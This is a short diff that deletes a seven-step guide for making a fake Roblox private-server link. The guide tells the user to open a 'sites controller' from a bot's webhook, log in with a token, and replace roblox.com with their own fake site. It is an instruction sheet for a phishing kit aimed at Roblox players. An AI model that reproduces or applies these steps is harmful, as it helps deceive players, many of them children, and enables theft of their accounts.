@@ -1,7 +1,0 @@
-1. Get to your sites controller (found in the embed the bot sent to ur webhook) 
-2. Login with the token you got
-3. Find your fake priv server link code, then copy it
-4. Find the game you want to make the fake server on, then copy it.
-5. MAKE SURE TO REPLACE THE roblox.com WITH YOUR FAKE SITE
-6. Put the link code behind and then copy the whole link
-7. done
